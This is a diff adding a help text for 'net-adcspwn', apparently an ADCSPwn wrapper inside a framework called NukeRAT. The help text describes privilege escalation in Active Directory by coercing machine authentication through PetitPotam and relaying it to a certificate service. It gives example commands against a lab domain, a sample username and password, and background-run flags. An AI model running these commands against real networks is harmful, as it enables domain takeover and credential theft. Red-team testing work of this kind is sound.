@@ -1,0 +1,36 @@
+ABOUT
+    ADCSPwn is a tool to escalate privileges in an Active Directory network by coercing
+    authentication from machine accounts (Petitpotam) and relaying to the certificate service.
+
+USAGE:
+    net-adcspwn --- --adcs <cs server> [options]
+
+EXAMPLES:
+    net-adcspwn --- --adcs cs.pwnlab.local
+    net-adcspwn --- --adcs cs.pwnlab.local --secure
+    net-adcspwn --- --adcs cs.pwnlab.local --port 9001
+    net-adcspwn --- --adcs cs.pwnlab.local --remote dc.pwnlab.local
+    net-adcspwn --- --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001
+    net-adcspwn --- --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cert_b64.txt
+    net-adcspwn --- --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson --password The0nly0ne! --dc dc.pwnlab.local
+    net-adcspwn --- --adcs cs.pwnlab.local --remote dc.pwnlab.local --dc dc.pwnlab.local --unc \\WIN-WORK01.pwnlab.local\made\up\share
+
+REQUIRED OPTIONS:
+    --adcs              Address of the AD CS server which authentication will be relayed to
+
+OPTIONAL OPTIONS:
+    --secure            Use HTTPS with the certificate service
+    --port              (Default: 8080) Port ADCSPwn will listen on
+    --remote            (Default: localhost) Remote machine to trigger authentication from
+    --username          Username for non domain context
+    --password          Password for non domain context
+    --dc                Domain controller to query for Certificate Templates (LDAP)
+    --unc               Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam)
+    --output            Output path to store base64 generated crt
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    net-adcspwn -w 60 --- --adcs cs.pwnlab.local
